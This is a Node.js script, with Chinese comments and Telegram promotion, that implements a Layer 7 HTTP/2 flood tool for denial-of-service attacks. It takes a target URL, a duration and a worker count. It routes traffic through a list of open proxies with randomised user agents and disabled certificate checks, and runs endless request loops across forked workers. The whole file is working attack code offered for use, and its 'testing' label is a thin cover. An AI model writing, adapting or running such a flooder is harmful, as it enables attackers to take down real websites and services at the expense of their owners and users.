//由Github提供,https://t.me/golangcc 编写, https://t.me/qdaili 发送
const { exec } = require('child_process');
require('events').EventEmitter.defaultMaxListeners = 0;
process.setMaxListeners(0);
var random_useragent = require('random-useragent');
const fs = require('fs');
const url = require('url');
const http = require('http');
const randstr = require('randomstring')
const cluster = require('cluster');
const tls = require('tls');
const crypto = require('crypto');
const http2 = require('http2');
tls.DEFAULT_ECDH_CURVE;

let payload = {};
function ra() {
const rsdat = randstr.generate({
        "charset":"123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM",
        "length":8
    });
    return rsdat
}
try {
var proxies = fs.readFileSync("proxies.txt", 'utf-8').toString().replace(/\r/g, '').split('\n');
} catch(error){
console.log('缺少代理文件!');
process.exit();
}

try {
var objetive = process.argv[2];
var parsed = url.parse(objetive);
} catch(error){
    console.log('请输入目标');
    process.exit();
}
const sigalgs = [
    'ecdsa_secp256r1_sha256',
    'ecdsa_secp384r1_sha384',
    'ecdsa_secp521r1_sha512',
    'rsa_pss_rsae_sha256',
    'rsa_pss_rsae_sha384',
    'rsa_pss_rsae_sha512',
    'rsa_pkcs1_sha256',
    'rsa_pkcs1_sha384',
    'rsa_pkcs1_sha512',
 ];

 let SignalsList = sigalgs.join(':');

const proxies_total = proxies.length - 2;
class TlsBuilder {
    constructor (socket){
        this.curve = "GREASE:X25519:x25519"; // Default
        this.sigalgs = SignalsList;
        this.Opt = crypto.constants.SSL_OP_NO_RENEGOTIATION|crypto.constants.SSL_OP_NO_TICKET|crypto.constants.SSL_OP_NO_SSLv2|crypto.constants.SSL_OP_NO_SSLv3|crypto.constants.SSL_OP_NO_COMPRESSION|crypto.constants.SSL_OP_NO_RENEGOTIATION|crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION|crypto.constants.SSL_OP_TLSEXT_PADDING|crypto.constants.SSL_OP_ALL|crypto.constants.SSLcom;
    }

    Alert(){
    }

    http2TUNNEL(socket){
        socket.setKeepAlive(true, 1000);
        socket.setTimeout(10000);
        payload[":method"] = "GET";
        payload["Referer"] = objetive;
        payload["User-agent"] = random_useragent.getRandom()
        payload["Cache-Control"] = 'no-cache, no-store,private, max-age=0, must-revalidate';
        payload["Pragma"] = 'no-cache, no-store,private, max-age=0, must-revalidate';
        payload['client-control'] = 'max-age=43200, s-max-age=43200';
        payload['Upgrade-Insecure-Requests'] = 1;
        payload['Accept'] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"; //'*/*';
        payload['Accept-Encoding'] = 'gzip, deflate, br';
        payload['Accept-Language'] = 'utf-8, iso-8859-1;q=0.5, *;q=0.1'
        payload[":path"] = parsed.path.replace(/\[rand\]/g,ra());

        const tunnel = http2.connect(parsed.href.replace(/\[rand\]/g,ra()), {
            createConnection: () => tls.connect({
                socket: socket,
                ciphers: tls.getCiphers().join(':')+":TLS_AES_128_CCM_SHA256:TLS_AES_128_CCM_8_SHA256"+":HIGH:!aNULL:!kRSA:!MD5:!RC4:!PSK:!SRP:!DSS:!DSA:"+'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA',
                host: parsed.host,
                servername: parsed.host,
                secure: true,
                //echdCurve: this.curve,
                honorCipherOrder: true,
                requestCert: true,
                secureOptions: this.Opt, //"SSL_OP_ALL",
                sigalgs: this.sigalgs,
                rejectUnauthorized: false,
                ALPNProtocols: ['h2'],
            }, () => {
                
        for (let i = 0; i < 12; i++) {

            setInterval(async () => {
                await tunnel.request(payload).close()
            });
        }
            })
     });
    }
}

BuildTLS = new TlsBuilder();
BuildTLS.Alert();
const keepAliveAgent = new http.Agent({ keepAlive: true, maxSockets: Infinity, maxTotalSockets: Infinity, maxSockets: Infinity });

function Runner(){

    for (let i = 0; i < 120; i++) {
var proxy = proxies[Math.floor(Math.random() * proxies.length)];
proxy = proxy.split(':');
                    
var req = http.get({ 
        host: proxy[0],
        port: proxy[1],
        timeout: 10000,
        method: "CONNECT",
        agent: keepAliveAgent,

        path: parsed.host + ":443"
        });
        req.end();
    
        req.on('connect', (_, socket) =>  {
            BuildTLS.http2TUNNEL(socket);
        });

        req.on('end', () => {
            req.resume()
            req.close();
          });
        }
}

setInterval(Runner)

 
if (cluster.isMaster){
    for (let i = 0; i<process.argv[4]; i++){
        cluster.fork();
    }
    console.log(`派出${proxies_total + 2}个代理对${objetive}进行测试,Layer7交流群:https:t.me/qprox`);
setTimeout(function() {
    process.exit(1);
}, process.argv[3] * 1000);
}

process.on('uncaughtException', function(er) {
});
process.on('unhandledRejection', function(er) {
});